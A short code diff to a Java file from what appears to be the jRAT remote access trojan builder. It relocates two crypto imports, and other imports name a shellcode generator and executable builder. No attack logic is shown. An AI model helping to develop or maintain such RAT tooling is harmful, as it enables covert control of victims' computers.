@@ -28,6 +28,8 @@ import pro.jrat.OSConfig;
 import pro.jrat.ShellcodeGenerator;
 import pro.jrat.build.Build;
 import pro.jrat.build.BuildExecutable;
+import pro.jrat.common.crypto.Crypto;
+import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.extensions.ExternalPlugin;
 import pro.jrat.extensions.PluginList;
 import pro.jrat.io.Files;
@@ -37,8 +39,6 @@ import pro.jrat.ui.components.Table;
 import pro.jrat.ui.frames.FrameBuild;
 import pro.jrat.ui.renderers.table.BuildTableRenderer;
 
-import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.common.crypto.EncryptionKey;
 
 @SuppressWarnings("serial")
 public class PanelBuildFinal extends JPanel {
